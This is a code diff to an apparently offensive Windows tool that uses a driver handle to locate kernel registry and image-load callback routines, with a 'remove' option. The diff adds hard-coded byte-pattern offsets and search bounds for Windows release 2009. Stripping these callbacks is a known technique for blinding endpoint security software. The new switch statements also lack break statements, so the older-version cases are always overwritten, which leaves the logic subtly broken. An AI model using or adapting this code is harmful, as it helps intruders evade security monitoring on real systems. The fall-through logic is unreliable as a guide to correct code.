@@ -290,18 +290,24 @@ struct Offsets {
     DWORD64 registry;
 };
 
-struct Offsets getVersionOffsets() {
+int getVersion() {
     wchar_t value[255] = { 0x00 };
     DWORD BufferSize = 255;
     RegGetValue(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", L"ReleaseId", RRF_RT_REG_SZ, NULL, &value, &BufferSize);
     wprintf(L"[+] Windows Version %s Found\n", value);
-    auto winVer = _wtoi(value);
+    return _wtoi(value);
+}
+
+struct Offsets getVersionOffsets() {
+    auto winVer = getVersion();
     switch (winVer) {
         //case 1903:
     case 1909:
         return { 0x8b48cd0349c03345, 0xe8d78b48d90c8d48, 0xe8cd8b48f92c8d48, 0x4024448948f88b48 };
     case 2004:
         return { 0x8b48cd0349c03345, 0xe8d78b48d90c8d48, 0xe8cd8b48f92c8d48, 0x4024448948f88b48 };
+    case 2009:
+        return { 0x8341f63345900000, 0xe8c10c8d48d68b48, 0xe8cd8b48f92c8d48, 0x5024448948f88b48 };
     default:
         wprintf(L"[!] Version Offsets Not Found!\n");
 
@@ -362,7 +368,18 @@ void findregistrycallbackroutines(DWORD64 remove) {
     const auto Device = GetDriverHandle();
     DWORD64 CmUnRegisterCallbackAddress = GetFunctionAddress("CmUnRegisterCallback");
     DWORD64 DbgkLkmdUnregisterCallbackAddress = GetFunctionAddress("DbgkLkmdUnregisterCallback");
-    DWORD64 patternaddress = PatternSearch(Device, CmUnRegisterCallbackAddress, DbgkLkmdUnregisterCallbackAddress, offsets.registry);
+    DWORD64 PsSetLoadImageNotifyRoutineEx = GetFunctionAddress("PsSetLoadImageNotifyRoutineEx");
+
+    DWORD64 endAddress = CmUnRegisterCallbackAddress;
+    switch (getVersion())
+    {
+    case 1909:
+    case 2004:
+        endAddress = DbgkLkmdUnregisterCallbackAddress;
+    case 2009:
+        endAddress = PsSetLoadImageNotifyRoutineEx;
+    }
+    DWORD64 patternaddress = PatternSearch(Device, CmUnRegisterCallbackAddress, endAddress, offsets.registry);
     DWORD offset = ReadMemoryDWORD(Device, patternaddress - 0x9);
     const DWORD64 callbacklisthead = (((patternaddress) >> 32) << 32) + ((DWORD)(patternaddress)+offset) - 0x5;
     Log("[+] Callbacklisthead: %p", callbacklisthead);
@@ -392,8 +409,19 @@ void findimgcallbackroutine(DWORD64 remove) {
     
     DWORD64 PsSetLoadImageNotifyRoutineExAddress = GetFunctionAddress("PsSetLoadImageNotifyRoutineEx");
     DWORD64 PsSetCreateProcessNotifyRoutine = GetFunctionAddress("PsSetCreateProcessNotifyRoutine");
+    DWORD64 PsRemoveCreateThreadNotifyRoutine = GetFunctionAddress("PsRemoveCreateThreadNotifyRoutine");
 
-    DWORD64 patternaddress = PatternSearch(Device, PsSetLoadImageNotifyRoutineExAddress, PsSetCreateProcessNotifyRoutine, offsets.image);
+    DWORD64 endAddress = PsSetLoadImageNotifyRoutineExAddress;
+    switch (getVersion())
+    {
+    case 1909:
+    case 2004:
+        endAddress = PsSetCreateProcessNotifyRoutine;
+    case 2009:
+        endAddress = PsRemoveCreateThreadNotifyRoutine;
+    }
+
+    DWORD64 patternaddress = PatternSearch(Device, PsSetLoadImageNotifyRoutineExAddress, endAddress, offsets.image);
     DWORD offset = ReadMemoryDWORD(Device, patternaddress - 0x7);
     const DWORD64 PspLoadImageNotifyRoutineAddress = (((patternaddress) >> 32) << 32) + ((DWORD)(patternaddress)+offset)-3;
     Log("[+] PspLoadImageNotifyRoutineAddress: %p", PspLoadImageNotifyRoutineAddress);
